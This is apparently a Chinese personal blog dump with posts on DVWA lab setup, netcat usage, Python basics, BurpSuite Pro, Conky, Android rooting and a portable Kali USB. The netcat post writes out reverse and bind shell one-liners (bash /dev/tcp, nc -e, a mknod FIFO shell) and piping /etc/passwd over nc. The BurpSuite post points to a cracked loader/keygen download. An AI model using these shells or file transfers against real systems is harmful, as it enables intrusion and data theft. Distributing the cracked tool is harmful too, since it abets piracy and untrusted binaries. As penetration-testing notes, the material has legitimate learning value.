{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"Who Am I？","text":"Free、Free、Free Privacy、Privacy、Privacy Hacking、Hacking、Hacking Hello! 我是谁？ 🤔说大实话，我也一直在问自己，并对自己的三观进行不断的质疑。对他人，鄙视那种教科书式、听风是雨、不经过大脑思考的人叫嚣！！！ F4n9X 这个网络ID算吗？（FourNineX） 当前生活于国内中原地带；崇尚自由的生活，当然这一切不会建立在伤害他人的基础上；希望你能懂我崇尚的哪个自由！！！ 目前关注G点： 人权自由算重重之重（反对网络审查） 个人隐私望NOT侵犯（拒绝人肉） 社会工程学人性弱点 渗透测试Hacking（理想道德黑客） ………… 除此之外： Ping-Pong（拿过奖的那种渣技术） 希望能和热爱自由的您做朋友😊 特挑食（请吃饭不要西餐）😋 热爱音乐（抖腿电音的那种） 技术书籍不错（去他妈的教科书） ………… Find Me: 👉 Github https://github.com/FanqXu 👉 Twitter https://twitter.com/Expert83551161 👉 Facebook 👉 ZhiHu 👉 Telegram https://t.me/f4n9x Thanks: Reference Tutorial By BY http://qiubaiying.top/about Reference Tutorial By cnfeat http://www.cnfeat.com/about/ Beautiful Theme By icarus https://github.com/ppoffice/hexo-theme-icarus 这个博客搭建于 Github Pages and Hexo。","link":"/about/index.html"},{"title":"Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"Web 渗透平台 DVWA 搭建","text":"介于法律问题🧐，其实是由于个人能力不足加上怂了😅，没能力也更没胆去互联网上做这类攻击类测试。 遂有了此文，搭建这样一个满是漏洞的该死的易受攻击的 Web 应用程序 渗透平台。 环境： 物理机 Ubuntu 18.04 desktop VirtualBox 5.2.18_Ubuntu 服务器 Ubuntu 16.04 server DVWA https://github.com/ethicalhack3r/DVWA http://dvwa.co.uk/ 此文分为三部分，第一部分为服务器的安装，第二部分为基本环境配置，第三部分为 DVWA 的部署。 0x00 安装 Ubuntu 服务器将 Ubuntu 16.04 server 安装至 VirtualBox ，当然安装到 VMware 中也行；其中一些简单的步骤并为截图。 我的主机名，webServ 设置用户名，亲测 admin 不可以 😂 不要加密家目录 将更改写入磁盘 不自动更新 这里是重点，需选择如图所示三项，其中 LAMP 即分别为 Linux 、Apache、MySQL、PHP。 设置 MySQL 的 root 密码 完成安装后重启 本地物理机 ssh 连上服务器 0x01 基本环境配置卸载 PHP7由于我们需要的是 PHP5 ，故通过下面一条命令将之前安装系统时装的 LAMP 中的 PHP7 卸载掉。 1$ sudo apt-get purge `dpkg -l | grep php| awk '{print $2}' |tr \"\\n\" \" \"` 安装 PHP5添加 PHP5 的 ppa 源 1$ sudo add-apt-repository ppa:ondrej/php 更新索引 1$ sudo apt-get update 更新系统所有软件 1$ sudo apt-get upgrade 安装 PHP5 1$ sudo apt-get install php5.6 依赖性安装依赖 1$ sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml 再次查看 PHP 版本 12345$ php -vPHP 5.6.40-1+ubuntu16.04.1+deb.sury.org+1 (cli) Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies Apache开启 Apache 服务 1$ sudo service apache2 start 完成后可以打开本地网页查看 Apache 服务是否正常，此处的 URL 为服务器的 IP 地址。 http://192.168.43.218 启用 Apache 中的 PHP5.6 模块 123456789101112131415161718192021222324$ sudo a2enmod php5.6perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_PAPER = \"zh_CN.UTF-8\", LC_ADDRESS = \"zh_CN.UTF-8\", LC_MONETARY = \"zh_CN.UTF-8\", LC_NUMERIC = \"zh_CN.UTF-8\", LC_TELEPHONE = \"zh_CN.UTF-8\", LC_IDENTIFICATION = \"zh_CN.UTF-8\", LC_MEASUREMENT = \"zh_CN.UTF-8\", LC_CTYPE = \"en_US.UTF-8\", LC_TIME = \"zh_CN.UTF-8\", LC_NAME = \"zh_CN.UTF-8\", LANG = \"en_US.UTF-8\" are supported and installed on your system.perl: warning: Falling back to a fallback locale (\"en_US.UTF-8\").Considering dependency mpm_prefork for php5.6:Considering conflict mpm_event for mpm_prefork:Considering conflict mpm_worker for mpm_prefork:Module mpm_prefork already enabledConsidering conflict php5 for php5.6:Module php5.6 already enabled 重启 Apache 服务 1$ sudo service apache2 restart 0x02 DVWA 部署下载下载 DVWA 到本地服务器 1$ sudo wget https://github.com/ethicalhack3r/DVWA/archive/master.zip 解压到相应目录 12$ sudo apt-get install unzip$ sudo unzip DWVA-master.zip -d /var/www/html/dvwa 这时就可以打开 Web 界面 http://192.168.43.218/DVWA/setup.php 提示需将一个配置文件修改名字 12$ cd /var/www/html/dvwa/config/$ sudo mv config.inc.php.dist config.inc.php 再次打开 Web 界面 选项及 PHP 模块 gd 此后，就根据Web界面的提示依次完成相应配置 开启 allow_url_include， 1$ sudo vi /etc/php/5.6/apache2/php.ini 开启这个就可让 include include_once require 和 require_once 都能用 url 和伪协议 1allow_url_include = On 安装 PHP 的一个模块 1$ sudo apt-get install php5.6-gd 打开 Web 界面查看 秘钥下一个就是 reCAPTCHA key，这个就有点麻烦，可能得需一个Google账号加科学上网。首先打开 dvwa 目录下的 config 目录下的一个配置文件。 1$ sudo vi dvwa/config/config.inc.php 打开后找到一下字段…… 12345# ReCAPTCHA settings# Used for the 'Insecure CAPTCHA' module# You'll need to generate your own keys at: https://www.google.com/recaptcha/admin$_DVWA[ 'recaptcha_public_key' ] = '';$_DVWA[ 'recaptcha_private_key' ] = ''; 按照提示，打开以上那个链接…… https://www.google.com/recaptcha/admin Label 栏里就填上 DVWA ，然后勾选 reCAPTCHA v3 以及 Accept ，最后点击 Register 。 将秘钥复制到配置文件中的相应位置， 12$_DVWA[ 'recaptcha_public_key' ] = '6LfKd4kUAAAAAEk6g_eoecny__1zZwdknXuE2Lju';$_DVWA[ 'recaptcha_private_key' ] = '6LfKd4kUAAAAAECiwIiv5nrmh_k75TsKabJt0f3W'; 保存退出，刷新页面就会看到生效。 目录可写权将上面三个目录修改可写权限 123$ sudo chgrp www-data /var/www/html/dvwa/hackable/uploads/$ sudo chgrp www-data /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt$ sudo chgrp www-data /var/www/html/dvwa/config/ 数据库密码最后，还有一个小问题就是关于数据库的密码，还是打开那个配置文件 1$ sudo vi dvwa/config/config.inc.php 找到以下字段 12345$_DVWA = array();$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'p@aap0rd'; 重点是最后这一项，将引号中的密码设置为之前设置的 MySQL 数据库密码 1$_DVWA[ 'db_password' ] = 'toor'; 而不是设置为空密码，若设置为空密码，点击 Create/Reset Database 就会出现不能连接 MySQL 服务 。 设置正确后再次点击 Create/Reset Database 点击登录，默认用户名 admin 密码 password 完成！！！","link":"/2019/01/14/DVWA/index.html"},{"title":"瑞士军刀 NETCAT 使用笔记","text":"Feature 网络工具中的瑞士军刀 侦听模式、传输模式 Telnet、获取Banner信息 传输即时文本信息、文件、目录 加密传输文件 远程控制、木马 加密所有流量 远程克隆硬盘 流媒体服务器 远程连接1$ nc -nv 192.168.43.218 80 12-n 后面跟IP地址，且不做域名解析-v 显示详细信息内容 信息传输文本传输 服务端： 123$ nc -l -p 4444-l 打开、侦听一个端口-p 端口 客户端： 12$ nc -nv 192.168.43.218 4444Connection to 192.168.43.218 4444 port [tcp/*] succeeded! 电子取证电子取证的原则就是尽量减少在被审计端的操作。 审计端： 1$ nc -l -p 4444 &gt; ps.txt 被审计端： 12$ ps aux | nc -nv 192.168.43.8 4444 -q 1-q 后面跟秒数，代表传输完成后多少秒断开连接 将进程信息由被审计端传到审计端。 文件传输 接受端 1$ nc -lp 4444 &gt; passwd.txt 发送端 1$ nc -nv 192.168.43.8 &lt; /etc/passwd -q 1 或者： 接收端 1$ nc -q 1 -lp 4444 &gt; passwd.txt 发送端 1$ nc -nv 192.168.43.8 4444 &lt; /etc/passwd 目录传输其实就是调用系统其他程序来完成功能的实现，包括下面的加密传输…… 发送端 1$ tar -cvf - /var/www/html/dvwa/ | nc -lp 4444 -q 1 接受端 1$ nc 192.168.43.218 4444 | tar -xvf - 加密传输 接受端 1$ nc -lp 4444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; passwd.txt 发送端 123456$ mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; /etc/passwd | nc -nv 192.168.43.8 4444 -q 1Enter the passphrase (maximum of 512 characters)Connection to 192.168.43.8 4444 port [tcp/*] succeeded!Please use a combination of upper and lower case letters and numbers.Enter passphrase: 000000Enter passphrase: 000000 流媒体服务 服务端 1$ cat vlc.mp4 | nc -lp 4444 客户端 1$ nc -nv 192.168.43.218 4444 | mplayer -vo x11 -cache 3000 - 端口扫描12$ nc -nvz 192.168.43.218 1-1024-z 端口扫描，无I/O输出模式 12$ nc -vnzu 192.168.43.218 1-1024-u 探测UDP流量，默认TCP 远程硬盘克隆调用系统命令 dd 来完成硬盘的克隆，从被取证端的 sda 磁盘克隆至取证端的 sda 磁盘。 取证端 1$ nc -lp 4444 | dd of=/dev/sda 被取证端 1$ dd if=/dev/sda | nc -nv 192.168.43.218 4444 -q 1 远程控制正向 被控制端 ubuntu 默认无 -e 参数；首先先修复nc，调出 -e 参数。 1$ sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc 1$ nc -lp 4444 -e /bin/bash 控制端 1$ nc -nv 192.168.43.218 4444 反向 控制端 1$ nc -lp 4444 被控制端 1$ nc -nv 192.168.43.8 4444 -e /bin/bash Shell 反弹实际渗透测试中，目标主机 nc 或可能没有、不支持 -e 参数；这时就需要以下方式： 攻击者（192.168.1.108） 12$ nc -lvvp 4444# 两个参数 v 代表显示更详细的信息。 目标主机 1$ bash -i &gt;&amp; /dev/tcp/192.168.1.108/4444 0&gt;&amp;1 命令解释： 1234567bash -i 产生一个交互式shell。&gt;&amp; 将联合符号(&amp;)前后内容相结合重定(&gt;)向至后者。/dev/tcp/ip/port linux中所有内容(设备、网络等)都被抽象成一个文件的形式而存在，这里意思就是对socket网络连接的一个抽象。0&gt;&amp;1 将标准输入和标准输出内容相结合，然后重定向至标准输出内容。 0 标准输入 1 标准输出 2 错误输出 整条命令的意思就是：bash 产生一个本地交互 shell 主动发起与攻击者(192.168.1.108)4444端口建立连接，重定向 TCP 4444连接到攻击者主机上；且将标准输入与标准输出相结合再次重定向给标准输出。即输入与攻击者输入命令，且接受命令输出！！！（表达能力有限） 或者： 1$ rm /tmp/reserve;mknod /tmp/reserve p;/bin/bash 0&lt;/tmp/reserve | nc 192.168.1.108 4444 1&gt;/tmp/reserve 命令解释： 12mknod 创建管道p 创建一个FIFO，FIFO的意思即为先进先出(first-in,first-out) 简单理解：首先先创建一个（先进先出）管道reserve，然后将一个本机交互shell重定向给管道reserve，再然后将输出通过 nc 重定向到攻击者那端，并且将 shell 执行结果重定向至管道reserve。 NCATNC 缺乏加密和身份验证的能力，营运而出一款支持加密的程序 NCAT；其包含于 NMAP 工具包中。 被控制端 1$ ncat -c bash --allow 192.168.43.8 -vnl 4444 --ssl 控制端 1$ ncat -nv 192.168.43.218 4444 --ssl …………Reference linux各种一句话反弹shell总结 为什么应该在 Linux 上使用命名管道","link":"/2019/04/20/NETCAT-使用笔记/index.html"},{"title":"Python笔记之列表与字典","text":"列表 0x00 list 列表 list 是 Python 内置的一种数据类型，它是一种有序的集合，可随时添加(append)和删除(pop)其中的元素。123&gt;&gt;&gt; VarName = ['elements0','elements1','elements2']&gt;&gt;&gt; VarName['elements0','elements1','elements2'] 这里变量 VarName就是一个list。len()函数获取 list 元素个数，若 list 中无一个元素，就是一个空的 list ，长度为0： 12345&gt;&gt;&gt; len(VarName)3&gt;&gt;&gt; test = []&gt;&gt;&gt; len(test)0 索引访问：1234567891011121314151617181920&gt;&gt;&gt; VarName[0]'elements0'&gt;&gt;&gt; VarName[1]'elements1'&gt;&gt;&gt; VarName[2]'elements2'&gt;&gt;&gt; VarName[3]Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;IndexError: list index out of range&gt;&gt;&gt; VarName[-1]'elements2'&gt;&gt;&gt; VarName[-2]'elements1'&gt;&gt;&gt; VarName[-3]'elements0'&gt;&gt;&gt; VarName[-4]Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;IndexError: list index out of range 索引是从0开始，并且当索引超出了范围时，会报一个 IndexError 错误。取最后一个元素，还可用-1做索引；以此类推，可获取倒数第2个、倒数第3个。 因为list是一个可变有序表，所以可往其中添加、插入、删除、替换元素：1234&gt;&gt;&gt; sports = ['table tennis','badminton']&gt;&gt;&gt; sports.append('Tai Chi')&gt;&gt;&gt; sports['table tennis','basketball','Tai Chi'] append()方法将元素追加到末尾，将元素插入指定位置使用insert()方法，例如插入一元素至首(0)：12345&gt;&gt;&gt; sports['table tennis','basketball','Tai Chi']&gt;&gt;&gt; sports.insert(0,badminton)&gt;&gt;&gt; sports['badminton','table tennis','basketball','Tai Chi']pop()方法删除 list 末尾的元素：1['badminton','table tennis','basketball']pop(i)方法删除指定位置的元素，i 是索引位置1234&gt;&gt;&gt; sports.pop(2)'basketball'&gt;&gt;&gt; sports['badminton','table tennis']替换，直接赋值给对应索引位置：123&gt;&gt;&gt; sports[0] = 'swim'&gt;&gt;&gt; sports['swim','table tennis']list 中的元素可以不同，可以同时有字符串、数型、布尔型；另外，list 中一个元素可为另一个 list1234567891011&gt;&gt;&gt; proLanguage = ['java','python',['html','css'],'c++']&gt;&gt;&gt; len(proLanguage)4&gt;&gt;&gt; proLanguage[2]['html','css']&gt;&gt;&gt; webDesign = ['html','css']&gt;&gt;&gt; proLanguage = ['java','python',webDesign,'c++']&gt;&gt;&gt; proLanguage[2] == webDesignTrue&gt;&gt;&gt; proLanguage[2][0] == webDesign[0] == 'html'True0x01 tuple另一种有序列表叫元组：tuple123&gt;&gt;&gt; sex = ('male','female')&gt;&gt;&gt; sex('male','female')tuple 与 list 较相似；但 tuple 一旦初始化就不能修改。它没有append()、insert()方法，可以正常使用sex[0]、sex[1]，但不能赋值成另外的元素；其他获取元素的方法和 list 一样。tuple 不可变，所以代码更加安全；若能够代替 list ，请尽量使用 tuple 。 一个“可变的” tuple12345&gt;&gt;&gt; varTuple = ('A','B',['a','b'])&gt;&gt;&gt; varTuple[2][0] = 'X'&gt;&gt;&gt; varTuple[2][1] = 'Y'&gt;&gt;&gt; varTuple('A','B',['X','Y'])表面上，tuple 元素确实变了，但其实变的是 list 的元素。请注意： 当定义只有１个元素的 tuple，如果： 123&gt;&gt;&gt; numOne = (1)&gt;&gt;&gt; numOne1 请注意，这是一个错觉。这时，定义的不是 tuple，而是给变量numOne赋值１这个数！因为括号()既可表示 tuple，又可表示数学中的小括号。因此，Python 规定，这种情况下按小括号进行计算。 所以，只有１个元素的 tuple 定义时须加一个逗号, ： 123&gt;&gt;&gt; numOne = (1,)&gt;&gt;&gt; numOne(1,) 然后，Python 在显示只有 1 个元素的 tuple 时，也会加一个逗号, ，以免误解成数学计算意义上的括号。 字典 0x00 dict Python 内置了字典，dict 全称 dictionary 。其他语言中，可能称作为 map ，具有极快的查找速度，使用 key-value(键-值)存储： 12345&gt;&gt;&gt; dictionary = {'zone':0,'one':1,'two':2}&gt;&gt;&gt; dictionary{'zone': 0, 'one': 1, 'two': 2}&gt;&gt;&gt; dictionary['one']1 dict 查找速度非常快，其实现原理就像查字典一样； 而 list 查找元素的方法就是从头到尾，一个一个地找，list 越大，查找越慢。 dict 就是先在字典的索引表中找到所要查找的元素所对应的页码，然后直接翻到该页面找到。 这种 key-value 储存方式，存放时必须根据 key 算出 value 的存放位置；取的时候才能根据 key 直接拿到 value 。重要牢记：key必须是不可变对象 。 通过key放入： 123&gt;&gt;&gt; dictionary['four'] = 4&gt;&gt;&gt; dictionary['four']4 后到优先： 123456&gt;&gt;&gt; dictionary['var'] = 5&gt;&gt;&gt; dictionary['var']5&gt;&gt;&gt; dictionary['var'] = 6&gt;&gt;&gt; dictionary['var']6 一个 key 只能对应一个 value ，So，后到优先 。 key 不存在，dict 就会报错： 1234&gt;&gt;&gt; dictionary['ten']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'ten' 判断 key 是否存在： 123456789&gt;&gt;&gt; 'ten' in dictionaryFalse&gt;&gt;&gt; dictionary.get('ten')&gt;&gt;&gt; dictionary.get('zone')0&gt;&gt;&gt; dictionary.get('ten',10)10&gt;&gt;&gt; dictionary{'zone': 0, 'one': 1, 'two': 2} 两种方法，一是通过 in 判断；二是 dict 提供的 get 方法， key 不存在，会返回 None （交互式不显示None）；通过 get 方法还可以指定一个 value ，但是不会加入此字典，如上所示。 删除： 1234&gt;&gt;&gt; dictionary.pop('one')1&gt;&gt;&gt; dictionary{'zone': 0,'two': 2} 使用 pop(key) 方法删除 key ，所对应的 value 也会从 dict 中删除； dict 内部存放顺序和 key 放入顺序无关。 特点： dict 查找、插入速度极快，不受key的增加而受影响 需占用大量内存 list 查找和插入的时间会随元素的增加而增加 占用内存较小 0x01 set set 和 dict 非常类似，也是一组 key 的集合，但其不存储 value 。 123&gt;&gt;&gt; setEx = set(['zone','one','two'])&gt;&gt;&gt; setEx{'zone','one','two'} 创建一个 set 需要提供一个 list 作为输入集合；传入参数 [zone,one,two] 是一个 list ，而显示的 {zone,one,two} 只是说明 setEx 内部有这三个元素。注意显示的顺序不代表 set 是有序的； set 中的 key 不能重复。 添加/删除： 123456&gt;&gt;&gt; setEx.add('three')&gt;&gt;&gt; setEx{'zone','one','two','three'}&gt;&gt;&gt; setEx.remove('zone')&gt;&gt;&gt; setEx{'one','two','three'} add(key) 方法添加元素（可重复添加，但然并卵），remove(key) 方法删除元素。 另外，set 可做数学意义上的交集、并集等： 123456&gt;&gt;&gt; setEx1 = set(['one','two','three'])&gt;&gt;&gt; setEx2 = set(['two','three','four'])&gt;&gt;&gt; setEx1 &amp; setEx2{'two','three'}&gt;&gt;&gt; setEx1 | setEx2{'one','two','three','four'} set 和 dict 唯一区别在于 value ，set 同样不可放入可变对象，list 放入 set 会报错。 12345&gt;&gt;&gt; setEx3 = set([1,3,[4,5]])Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: unhashable type: 'list'","link":"/2018/11/06/Python列表之list与tuple/index.html"},{"title":"BurpSuite Pro v1.7.37安装指南","text":"BurpSuite 是一款在 Web 渗透中不可或缺的工具；每一位 Web 渗透者都应该学会使用，这句话也一点不为过。本文就其 Pro 版本来作一个安装记录。 感谢某逆向大神做出的贡献👍。 Java 环境Burpsuite 是一款使用 Java 编写的非开源工具，可以跨平台使用，但需要 Java 的环境；而且对开源的那个还不太友好，只得下载 Oracle 闭源的那个👎。而且得下载8那个版本，12那个又会对 Burp 有影响。 官网 Java SE Development Kit 8u201 下载传送门 安装离线下载下来后，解压至系统的相应目录。 1$ sudo tar zxvf jdk-8u201-linux-x64.tar.gz -C /usr/local/ 环境变量编辑 Java 环境变量。 1$ sudo vim /etc/profile 添加至尾行： 12export JAVA_HOME=/usr/local/jdk1.8.0_201/export PATH=$JAVA_HOME/bin:$PATH 之后建议重启系统，再开机就可以查看到版本了。 1234$ java -versionjava version \"1.8.0_201\"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) Burpsuite首先先从我的百度网盘上下载到本地。 链接: https://pan.baidu.com/s/14I4dLIS7Fa8nBCN0aPnKoQ 提取码: vqhn 解压至相应位置： 1$ unzip -d ~/burp/ Burp_Suite_Pro_v1.7.37_Loader_Keygen.zip 快速启动首先先不要运行，先做一个启动脚本。 创建启动脚本 startburp.sh： 12$ vim ~/burp/startburp.shjava -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.37.jar 赋予权限： 1$ chmod +x ~/burp/startburp.sh 激活首先先使用脚本启动打开 Burp，然后使用命令打开注册机。 12$ cd burp/ &amp;&amp; ./startburp.sh$ java -jar ~/burp/burp-loader-keygen.jar 首先先同意 Burp Suite Licence；然后如下图中所示，在注册机中第一个框 License Text 随意输入，再将 License 中的字符串复制至 Burp 中，点击 Next 。 点击 Manual activation， 将 Burp 中第二个框中的字符串复制至注册机中 Activation Request。 再次将注册机中 Activation Response 复制至 Burp，点击 Next。 如下图，即代表成功！！！ Reference https://www.52pojie.cn/thread-691448-1-1.html","link":"/2019/04/12/burp-install/index.html"},{"title":"Ubuntu Conky 折腾笔记","text":"Linux 系统属于开源软件，它并非开箱即用的商业产品（Windows，MacOS）。其桌面系统需要大量的定制、美化、优化，才能用起来舒畅顺滑；这也可能是无数初学者初试受挫，并最终放弃的主要原因。 来自一位敬佩的安全前辈 所以本文就 Ubuntu 桌面美化的一次折腾做一个小笔记。 说到桌面美化，就得聊到动态监视器 Conky。 Conky 是什么 | What？ Github: https://github.com/brndnmtthws/conky Youtube: https://www.youtube.com/watch?v=bHtpLEoRKmg&amp;t=19s 其实，简单来说。Conky 是一款免费的轻量级系统监视器，可以在桌面上显示任何类型的信息。 特征 | Features据官方说明 我承认以下几段都是抄袭官方的，还有上面几段 ，其可显示300+个内置对象，包括支持： 大量操作系统统计数据 内核、运行时间、CPU使用、内存使用、磁盘使用、网络…… 内置 IMAP 和 POP3 可使用内置的 Lua 支持或自己的脚本和程序进行扩展 内置 Imlib2 和 Cairo 支持 OS Linux、FreeBSD、OpenBSD、Solaris 和 macOS…… 不好意思，真没 Windows😝 …… 可以以文本形式显示信息，也可使用简单的进度条和图形小部件以及不同的字体和颜色显示信息。（重点） 快速开始 | Quickstart终于扯到正点上去了，以上貌似都是废话。 安装 | Install介于我的是 Debian 系，直接使用 APT 包管理安装；其他发行版本自行解决吧，这又不是啥难事😎。 1$ sudo apt install conky-all 配置 | Configuration其实，主要就是一份流弊的配置文件。 关于我的配置文件，其实是一名高中生（至此文撰写）@Lunatic 在网上收集并修改的。他首先是先在其 Arch 上完美运行，之后发布至 Github 个人仓库。 由于他是 Arch，我使用他的配置文件并不能完美滴在我的系统上展现出来。 又过来很长一段时间，我又发现一位 Arch 用户@纤魂 已将 Lunatic 的配置文件魔改滴很到位，将其安装方式改的更加的简单，一个脚本的事。 随后，我就将纤魂的那个关于配置文件的仓库 fork 到我的仓库下，并作出一些变动；擅自主张滴将 Arch Logo 删掉，并修改了启动脚本。为的是给更多 Linux 用户介绍出这一优秀、漂亮、炫酷的桌面监视器，希望有后来者可折腾出更流弊的配置文件。 Lunatic https://github.com/9527tech/conkyrc 纤魂 https://github.com/AsucreYau/conkyrc 本渣渣 Forked From AsucreYau/conkyrc https://github.com/FanqXu/conkyrc 如果你是 Ubuntu/Debian 用户，你可以试试将本渣渣的仓库克隆至本地；Arch 用户直接看他两的仓库吧；其他系的，如果使用的是 Gnome 桌面，也可试着来吧。 1$ git clone https://github.com/FanqXu/conkyrc.git 然后进入此目录开始执行安装脚本。 12$ cd conkyrc$ ./install.sh 然后就 OK 了，如果不行就执行一条命令或者重新登录桌面。 1$ source ~/.xprofile 关于启动脚本，以后每次开机后的5秒后开始启动 Conky 配置文件。 1234567891011121314151617181920212223$ bat startconky.sh───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: startconky.sh───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ killall conky 4 │ 5 │ # time (in s) for the DE to start; use ~20 for Gnome or KDE, less for Xfce/LXDE etc 6 │ sleep 5 7 │ 8 │ # the main conky with rings 9 │ conky -c ~/.config/conky/rings --daemonize --quiet --pause=7 10 │ 11 │ # time for the main conky to start; needed so that the smaller ones draw above not below (probably can be lower, but we still have to wait 5s for the rings to avoid segfaults) 12 │ sleep 1 13 │ 14 │ conky -c ~/.config/conky/cpu --daemonize --quiet 15 │ conky -c ~/.config/conky/ram --daemonize --quiet 16 │ conky -c ~/.config/conky/network --daemonize --quiet 17 │ conky -c ~/.config/conky/disk --daemonize --quiet 18 │ conky -c ~/.config/conky/clock --daemonize --quiet───────┴─────────────────────────────────── 截屏 | Screenshot 最后 | Finally说到底，此文貌似就是使用 CV 大法而来的😅。 也罢，希望能够见到更流弊的 Conky 桌面吧！！！ Reference https://mp.weixin.qq.com/s/powz0x…… https://github.com/brndnmtthws/conky https://github.com/9527tech/conkyrc https://github.com/AsucreYau/conkyrc https://github.com/FanqXu/conkyrc","link":"/2019/04/03/conky-ubuntu/index.html"},{"title":"Hexo基本使用","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2018/10/10/hello-world/index.html"},{"title":"拿到Android Root管理权","text":"首先，安全第一，请不要将日常生活使用的手机拿来这样搞；尤其是用来做支付的手机。 其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。 高可玩性，是有了 root 管理权后的自由，所以便有了此文。 环境： 代号 capricorn 的 Mi 5S MIUI 10 Android 7.0 前期准备： Windows 系统（最好不要使用虚拟机） USB 数据线 需登录小米账号 电量得足，最好100% 手机上开启 USB 调试 关于如何开开启 USB 调试，打开【设置】&gt;&gt;&gt;【我的设备】&gt;&gt;&gt;【全部参数】&gt;&gt;&gt;【MIUI 版本】连续点击6下，回到【设置】首页，进入【更多设置】&gt;&gt;&gt;【开发者选项】，找到并点亮USB调试。 Bootloader解锁小米手机解锁申请： http://www.miui.com/unlock/index.html 申请成功后，将解锁工具下载并解压到本地，打开可以看到以下文件 由于我不是Windows系统，所以窗口和图标有所不同，但文件名都相同；其中 driver_install_64.exe 一个为64位的Windows安装驱动的文件 MiUsbDriver.exe 为安装USB驱动文件 miflash_unlock.exe 即为解锁文件 其他暂不用关心，将你的电脑与手机用数据线连接起来； 打开顺序，先把驱动安装完，然后打开解锁文件miflash_unlock.exe。 如图，首先打开工具登录查询： 其次，进入Fastboot模式，开始解锁 验证 关于Android机，能把Bootloader锁了的，基本上都可以拿到root管理权。所以这一步成功了，后面的基本都不用担心了，问题都不大。 刷入TWRP 关于TWRY，它是一个替换系统自带Recovery模式的工具，由于系统自带的Recovery模式功能太简陋（一切为了安全）。 这里暂且不较真将它简单地认为为电脑的 BIOS 。 官网：https://twrp.me 下载（此链接仅适用于capricorn）：https://dl.twrp.me/capricorn/ 先将其最新版本下载到本地计算机，它的名称就像twrp-x.x.x-x-capricorn.img。建议将其放入之前那个小米解锁工具的文件夹中。 进入 FASTBOOT然后，打开你的Windows中的CMD，切换当前路径为那个解锁工具的目录，然后使用以下命令将其重启到FASTBOOT模式。 1adb reboot bootloader 如果不懂上面这种方法，你还可以通过组合键到 FASTBOOT 模式； 重启设备，在进入开机的开始，按住Volume Down+Power，直至屏幕上出现 FASTBOOT。 成功进入后，你还可以通过以下命令验证电脑是否找到手机 1fastboot devices 刷入 TWRY1fastboot flash recovery twrp-x.x.x-x-capricorn.img 注意命名 验证同时按住 音量上键 ＋ 电源键 ，没有进入 TWRY 的 Recovery 模式界面绝不要松手，直到进入 TWRY 的 recovery 界面为止。如下图，即为成功： 安装Magisk 关于Magisk，其强大的功能，使得我们普通玩家足以与厂商进行博弈。还是开源的，很给力。 Magisk仓库：https://github.com/topjohnwu/Magisk 其功能： 集成 root（MagiskSU） SafetyNet root 和 Magisk 的日志功能 Magisk Hide（隐藏 Magisk 的 root 权限） systemless hosts（广告屏蔽） Magisk 模块（例如，Xposed） Magisk工具包下载：https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ 提取码: d8fy 安装下载上面的工具包，将其中的Magisk-v18.0.zip复制到手机的 /sdcard 目录下，然后重启到Recovery模式下，安装这个zip包，找到这个包，然后滑动滑块，开始刷入…… 完成后重启，在桌面上可以找到Magisk Manager，这个是Magisk的管理工具。 至此，你就拿到了设备的root管理权","link":"/2019/01/03/mi5s-magisk/index.html"},{"title":"便携式Kali Linux创建","text":"本文由早前一简单想法而萌生，由此便有了本文。 我的想法就是，首先将一系统装入U盘或者移动硬盘；然后在其他计算机上也可使用；再然后我想不妨网吧走一遭、试一试，美滋滋；最后，ms17-010拿到网管机子的shell（此招本文不会涉及）！！！ 当然，也不一定可行，如果某电脑开启了BIOS锁（不过就我看来这种情况较少），就不行了；其次，在网吧这样也蛮危险(小心被网管打断狗腿，哈哈)！！！ 废话不多说…… 0x00 此前准备 Kali Linux ISO 镜像文件（下载传送门） Rufus（下载传送门） 一台搭载视窗操作系统的电脑 U盘或移动硬盘 说明： 此文所安装的 Kali Linux 非 live ，而是持久性的。 本人Kali镜像包：kali-linux-2018.4-amd64.iso。Rufus只能安装在视窗上使用；U盘或移动硬盘自行准备，U盘建议3.0以上（本人金士顿3.0 64G依然卡），遂改用非SSD移动硬盘，当然SSD会更好。 0x01 正式开始之点鼠标操作首先，打开安装好了的 Rufus；如果你的是U盘，那么在设备项会自动识别你的U盘设备；如果是移动硬盘，应先勾上显示USB外置硬盘才能识别你的移动硬盘设备。下一步，在引导类型选择中选择你的Kali镜像。再下一步，选择 NTFS 的文件系统；其他选择项默认就行，可以点击开始了。 一图概括： 然后，就会出现下面这种情况，选择第二项： 再然后，直接点击确认： 最后，看到如下状态，等会儿： 至此，视窗上的操作已完成…… 0x02 